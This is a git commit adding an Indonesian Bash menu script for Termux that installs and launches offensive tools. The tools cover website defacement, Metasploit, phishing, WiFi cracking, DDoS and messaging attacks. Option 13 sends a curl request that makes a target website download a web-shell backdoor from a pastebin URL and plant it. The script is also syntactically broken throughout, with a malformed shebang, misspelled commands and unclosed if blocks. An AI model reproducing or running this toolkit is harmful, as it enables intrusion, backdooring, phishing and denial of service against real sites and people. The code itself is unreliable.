00ff22c1f2c858da586fcb41f3362ce187b37aa6
SATYA-GANZ <71710459+SATYA-GANZ@users.noreply.github.com>
2020-09-22 20:28:04 +0700

    Add files via upload

---
+++ MALAS-FRAMEWORK.sh
@@ -0,0 +1,280 @@
+#!bin/bash
+#LISENSI DIPEGANG OLEH TEAM SAYA DAN SAYA SENDIRI
+#COPYRIGHT 2020 MALAS-FRAMEWORK
+
+filget -f  MALAS | lolcat
+
+echo "=======================================" | lolcat
+echo " AUTHOR : MR.S4TY4" | lolcat
+echo " TEAM      : TeCoINDO" | lolcat
+echo " NOTE       : JANGAN RECODE YA bro" | lolcat
+echo "=======================================" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(1).DEFACE METODE WEBDAV" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(2).TOOLS HACK ANDROID (METASPLOIT)" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(3).TOOLS UNTUK NGERJAIN PENIPU" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(4).TOOLS SUBDOMAIN FINDER" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(5).TOOLS ADMIN FINDER" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(6).TOOLS HTTP HEADER" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(7).TOOLS UNTUK MENCARI BUG" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(8).TOOLS NMAP" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(9).TOOLS UNTUK CEK DIREKTORI WEB" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(10).TOOLS WHOIS LOOKUP" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(11).TOOLS UNTUK LACAK IP" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(12).TOOLS MEMPERCEPAT JARINGAN" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(13).AUTO UPLOAD SHELL BACKDOOR" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(14).TOOLS UNTUK PHISHING" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(15).TOOLS HACK WIFI (KHUSUS ROOT)" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(16).TOOLS UNTUK PARA ETEKEL" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(17).TOOLS UNTUK DDOS" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(18).TOOLS UNTUK PORT FORDWADING" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+echo "(0).EXIT" | lolcat
+echo "■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■" | lolcat
+read -p "ROOT@YOU~# " pill
+if [ $pill = "1"]
+then
+clear
+echo "sabar ya nyet" | lolcat
+pkg update && pkg upgrade
+pkg install git
+termux-setup-storage
+git clone https://github.com/V4N654T/DEPESER
+cd DEPESER
+chmod +x *
+bash DEPESER.sh
+
+
+
+if [ $pill = "2"]
+then
+clear
+echo "sabar ya nyet" | lolcat
+pkg update && pkg upgrade
+pkg install curl
+curl -LO https://raw.githubusercontent.com/Techzindia/Metasploit_For_Termux/master/metasploitTechzindia.sh
+sh metasploitTechzindia.sh
+cd metasploit-framework
+./msfconsole
+
+
+
+if [ $pill = "3" ]
+then
+clear
+echo "sabar ya asu" | lolcat
+sleep 2
+echo "proses...." | lolcat
+pkg update && pkg upgrade
+pkg install git
+pkg install python2
+pip2 install requests
+pip2 install mechanize
+pip2 install bs4
+git clone https://github.com/hekelpro/ripper/
+cd ripper
+python2 ripper.py
+
+
+
+if [ $pill = "4" ]
+then
+clear
+echo "sabar terus asw" | lolcat
+pkg update && pkg upgrade
+pkg install git
+git clone https://github.com/TUANB4DUT/SUBDO
+cd SUBDO
+./subdo.sh
+
+
+
+if [ $pill = "5" ]
+then
+clear
+echo "sabar ya nyet" | lolcat
+git clone https://github.com/mrcakil/admin_finder
+cd admin_finder
+chmod +x adfin.php cakil_wordlist.txt
+php adfin.php
+
+
+
+if [ $pill = "6" ]
+then
+clear
+echo "sabar asu" | lolcat
+git clone https://github.com/TUANB4DUT/HTTPHEADERS
+cd HTTPHEADERS
+bash HTTPHEADERS.sh
+
+
+
+if [ $pill = "7" ]
+then
+clear
+echo "SABAR ADALAH KUNCI HEKEL" | lolcat
+pkg install php
+pkg update && pkg upgrade
+pkg install git
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+cd RED_HAWK
+chmod +x *
+php rhawk.php
+
+
+
+if [ $pill = "8" ]
+then
+clear
+echo "ASU KOWE JANCOK" | lolcat
+pkg install nmap
+nmap -h
+
+
+
+if [ $pill = "9" ]
+then
+clear
+echo "BISA SABAR GK ASU" | lolcat
+git clone https://github.com/TUANB4DUT/DIRHUNT
+cd DIRHUNT
+
+
+
+if [ $pill = "10" ]
+then
+clear
+echo "SABAR YA BRO" | lolcat
+git clone https://github.com/TUANB4DUT/WHOIS
+cd WHOIS
+chmod 777 WHOIS.sh
+./WHOIS.sh
+
+
+
+if [ $pill = "11" ]
+then
+clear
+echo "MASUKKAN IP ADDRESS YANG MAU DILACAK :"
+curl http://www.geoplugin.net/json.gp\?ip\=$ip
+
+
+
+if [ $pill = "12" ]
+then
+clear
+echo "YAKIN INGIN MEMPERCEPAT JARINGAN? :"
+echo "PROSES DIMULAI..." | lolcat
+ping 8.8.8.8
+
+
+
+if [ $pill = "13" ]
+then
+clear
+figlet -f WELCOME | lolcat
+echo "CODED BY MR.S4TY4" | lolcat
+sleep 2
+echo "DONT USE THIS TOOLS FOR CRIME" | lolcat
+sleep 2
+echo ""
+read -p "MASUKAN TARGET BUNG: " url;
+echo "CONTOH : INDOXPLOIT.php :" shell;
+echo ""
+curl $url -d 'api=remoteUpload&dir=&filename=$shell&method=curl&url=https://pastebin.com/raw/dnYMztPd'
+echo ""
+echo "If success uploaded your shell path at /[path]/files/$shell"
+
+
+
+if [ $pill = "14" ]
+then
+clear
+pkg update && pkg upgrade
+pkg install python2
+pkg install git
+git clone https://github.com/evait-security/weeman
+cd weeman
+chmod +x *
+python2 weeman.py
+
+
+
+if [ $pill = "15" ]
+then
+clear
+apt install aircrack-ng iw wireless-tools ethtool tsu
+apt update && apt upgrade -y
+apt install git python2
+git clone https://github.com/derv82/wifite
+cd wifite
+chmod +x wifite.py
+tsudo python2 wifite.py
+
+
+
+if [ $pill = "16" ]
+then
+clear
+pkg update && pkg upgrade -y
+pkg install git
+git clone https://github.com/IntiTutorial/VIRTEX
+cd VIRTEX
+bash VIRTEX.sh
+
+
+
+if [ $pill = "17" ]
+then
+clear
+apt update && apt upgrade
+apt install python2
+apt install python
+apt install git
+git clone http://github.com/cyweb/hammer
+cd hammer
+python hammer.py
+
+
+
+if [ $pill = "18" ]
+then
+clear
+pkg update && pkg upgrade
+pkg install wget
+pkg install zip
+pkg install unzip
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
+unzip ngrok-stable-linux-arm.zip
+echo "SETELAH INI TINGGAL DAFTAR KE WEB NGROK NYA"
+sleep 1
+echo "ABIS ITU COPY TOKEN NGROK ANDA"
+
+
+
+if [ $pill = "0" ]
+then
+clear
+echo
+echo "BYE BYE" | lolcat
+sleep 2
+exit
+fi
